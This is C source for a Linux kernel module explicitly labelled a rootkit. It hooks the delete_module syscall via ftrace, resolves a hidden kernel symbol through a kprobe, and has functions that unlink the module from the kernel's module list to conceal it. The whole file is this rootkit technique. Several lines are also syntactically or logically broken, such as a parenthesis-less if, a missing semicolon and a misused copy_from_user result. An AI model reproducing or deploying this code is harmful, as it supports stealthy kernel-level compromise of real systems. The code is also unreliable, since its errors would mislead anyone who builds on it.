
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/string.h>
#include <linux/netfilter_defs.h>
#include <linux/delay.h>
#include <linux/namei.h>
#include <linux/syscalls.h>
#include <linux/fs.h>

    
#define rootkit_name "rootkit"

MODULE_LICENSE("GPL");
MODULE_VERSION("0.02");


static asmlinkage long (*orig_delete_module_func)(const char __user *, unsigned int flags);
static struct list_head *prev_module;

static struct kprobe kp1 = {
    .symbol_name = "find_module"
};

static void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

asmlinkage long delete_module_func(const char __user *name_user, unsigned int flags)
{
    long ret;
    //add find_module fuction from kernal
    typedef struct module(*find_module_t)(const char *name);
    find_module_t find_module;
    register_kprobe(&kp1);
    find_module = (find_module_t) kp1.addr;
    unregister_kprobe(&kp1);

    char module_name[MODULE_NAME_LEN];
    int name_len;
    struct module mod;

    printk(KERN_INFO "Delete module called with name %x\n", name_user);
    //copy from user
    name_len = copy_from_user(module_name, name_user, sizeof(module_name));
    printk(KERN_INFO "name_len %d", name_len);
    if (name_len < 0 ) {
        printk(KERN_INFO "failed");
        goto done;     
    }
    //adding null bit at the end
    module_name[name_len - 1] = '\0';
    printk(KERN_INFO "module_name: %s\n",module_name);
    mod = find_module(module_name);
    printk(KERN_INFO "Module %s was deleted\n", mod.name);

    if  strcmp(mod.name,rootkit_name){
        showme()
    } 

done:

    ret = orig_delete_module_func(name_user, flags);    
    return ret;
}



/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_delete_module", delete_module_func, &orig_delete_module_func),

};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;
    // hideme();

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
